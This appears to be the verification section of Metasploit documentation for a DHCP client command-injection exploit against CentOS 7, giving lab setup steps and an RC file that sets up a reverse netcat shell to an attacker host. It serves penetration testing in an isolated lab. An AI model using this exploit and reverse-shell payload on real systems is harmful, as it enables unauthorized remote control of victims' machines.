## Verification Steps

- Setup CentOS virtual machine and Kali virtual machine
- Ensure proper versions are in use. This was tested on `CentOS Linux release 7.4.1708 (Core)` with NetworkManager version `1.8.0-11.el7_4`
- Create isolated custom network (e.g. 192.168.41.0/24)
- Disable DHCP server on custom network for easier verification 
- Start `msfconsole` on Kali Linux
- `use exploit/unix/dhcp/rhel_dhcp_client_command_injection`
- Configure `SRVHOST` and `NETMASK` required variables
- Configure `PAYLOAD` and supporting options
- Start the DHCP server
- On CentOS 7 machine, request a new DHCP address. Assuming primary interface is `ens33`, you can use: `clear && nmcli conn down id "ens33" && nmcli conn up id "ens33" && ip addr show`
- This should request a new DHCP from your server (if other DHCP servers exist, note that then this becomes a race condition often requiring DHCP NAK's to get your DHCP to win)

Validated using RC File:

```
use exploit/unix/dhcp/rhel_dhcp_client_command_injection
set SRVHOST 192.168.41.129
set NETMASK 255.255.255.0
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.41.2
set LPORT 1337
exploit -j -z
```
